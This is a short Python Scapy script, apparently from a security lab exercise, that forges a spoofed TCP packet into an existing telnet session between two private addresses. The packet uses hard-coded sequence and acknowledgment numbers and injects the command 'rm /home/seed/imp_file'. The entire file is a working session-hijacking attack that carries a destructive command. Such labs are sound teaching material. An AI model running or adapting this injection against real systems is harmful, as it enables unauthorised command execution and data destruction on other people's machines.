#!/usr/bin/env python3
from scapy.all import *

ip  = IP(src="10.9.0.6", dst="10.9.0.5")
tcp = TCP(sport=56116, dport=23, flags="A", seq=2358863967, ack=3352341360)
data = "\nrm /home/seed/imp_file\n"
pkt = ip/tcp/data
ls(pkt)
send(pkt, verbose=0)
